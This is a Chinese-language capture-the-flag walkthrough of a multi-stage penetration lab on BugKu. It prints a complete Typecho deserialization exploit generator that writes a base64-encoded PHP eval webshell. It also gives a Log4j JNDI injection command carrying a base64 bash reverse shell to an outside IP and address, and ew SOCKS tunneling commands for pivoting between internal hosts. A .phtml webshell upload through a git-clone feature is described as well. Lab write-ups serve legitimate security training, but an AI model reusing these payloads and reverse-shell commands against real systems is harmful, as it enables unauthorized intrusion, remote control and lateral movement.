# BugKu-PAR-渗透测试2

dirsearch扫描发现.git源码泄露

使用githack下载下来，查看文件发现是**Typecho，Typecho存在一个反序列化漏洞可导致命令执行**

payload

```bash
<?php
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();

    public function __construct()
    {
        $this->_params['screenName'] = "echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d > 2.php";
        $this->_filter[0] = 'system';
    }
}

class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    /** 定义ATOM 1.0类型 */
    const ATOM1 = 'ATOM 1.0';
    /** 定义RSS时间格式 */
    const DATE_RFC822 = 'r';
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = 'c';
    /** 定义行结束符 */
    const EOL = "\n";
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct()
    {
        $this->_type = self::RSS2;
        $item['link'] = '1';
        $item['title'] = '2';
        $item['date'] = 1507720298;
        $item['author'] = new Typecho_Request();
        $item['category'] = array(new Typecho_Request());

        $this->_items[0] = $item;
    }
}

$x = new Typecho_Feed();
$a = array(
    'host' => 'localhost',
    'user' => 'xxxxxx',
    'charset' => 'utf8',
    'port' => '3306',
    'database' => 'typecho',
    'adapter' => $x,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($a)));
?>
```

base64写马，蚁剑连接在根目录发现flag，在web目录下还存在admin.ini.php文件，里面存放着数据库的账号和密码，使用蚁剑插件连接在数据库中发现flag

开始打内网，查看/etc/hosts确定下一目标地址

```bash
cat /etc/hosts
```

通过蚁剑上传ew搭建代理

kali执行：(在本地起了一个端口为1010的socks5代理)

```bash
 ./ew_for_linux64 -s rcsocks -l 1010 -e 7777
```

蚁剑执行：

```bash
 ./ew_for_linux64 -s rssocks -d kali地址 -e 8888
```

连接成功后，kali那边会回显ok

利用蚁剑上传fscan扫描内网并将结果保存到a.txt中

```bash
fscan -h 内网地址 > a.txt
```

扫到一个web站点，访问是一个登录框，点击登录时会在返回头中提示源码文件名

下载源码解压可以看到是log4j，那就很明显了就是打log4j

使用vps起一个jndi服务

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzQuNTYuMjAwLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "49.234.56.200"
```

那段base64编码内网就是要执行的反弹shell命令，把反弹地址和端口换成自己的并开启监听

之后在那台存在log4j的靶机上执行

```bash
${jndi:rmi://119.91.32.206:1099/fv304f}
```

`rmi://119.91.32.206:1099/fv304f` 要根据你的jndi服务来填写

执行成功后会弹回来一个shell是root权限，在起根目录和root目录下都存在flag文件，在根目录下还存在一个start.sh文件，查看该文件可以发现是把flag写到了js文件中，查看js文件得到flag

接着在这台log4j的机器上执行cat /etc/hosts寻找下一目标地址

```bash
cat /etc/hosts
```

也可以通过 ip add等方法查看ip地址

确定好下一目标地址之后，就要设置代理了，kali开启web服务

```bash
python3 -m http.server
```

将ew放到这个临时web目录下

在目标机器上使用wget下载ew

```bash
wget http://0.0.0.0:8000/ew_for_linux64
```

为了信息收集，在把fscan下载了

```bash
wget http://0.0.0.0:8000/fscan_amd64
```

接下来设置代理

kali执行：

```bash
 ./ew_for_linux64 -s rcsocks -l 1000 -e 8888
```

在本地的1000端口上起了个socks5代理

靶机执行：

```bash
./ew_for_linux64 -s rssocks -d kali地址 -e 8888
```

执行成功后kali那边会回显ok，此时代理已经搭建好，下面就利用fscan信息收集确定好攻击目标

```bash
./fscan_amd64 -h 目标地址段
```

扫到了192.168.1.3，火狐浏览器设置代理，此时的代理就不是第一个ew代理了，而是第二个也就是端口为1000的代理地址

访问192.168.1.3，开启了web服务，里面的功能就类似于你输入一个github仓库地址，他就会给你clone下来，然后你可以访问他clone后的文件

在clone仓库的过程中也会clone仓库中的文件，也不免可以猜到在仓库里放置一个一句话木马，在它clone后去访问，但是正常的.php后缀是不会执行，经过测试后发现.phtml是可以被执行的

在仓库中编写一个.phtml后缀的一句话木马文件，输入仓库地址，他clone后直接访问就getshell，在根目录发现flag

接下来还是一样的套路查看网卡信息，kali开启web服务，靶机下载fscan扫描，下载ew设置代理，需要注意的是代理地址记得要改变否则会被占用，就会代理搭建失败

fccan扫描

```bash
./fscan_amd64 -h 目标地址段
```

设置代理

kali执行：

```bash
 ./ew_for_linux64 -s rcsocks -l 1040 -e 9999
```

此时的代理端口就是1040

靶机执行

```bash
./ew_for_linux64 -s rssocks -d kali地址 -e 9999
```

最后两个flag给了两个提示分别是`guest`和 `/` ，通过fscan扫描也可以发现内网有台主机开放了21ftp服务

账号密码都是guest，ls发现flag，get flag下载下得到第七个flag

切换到跟目录 `cd /` 下载根目录中的最后一个flag

至此flag全部拿到！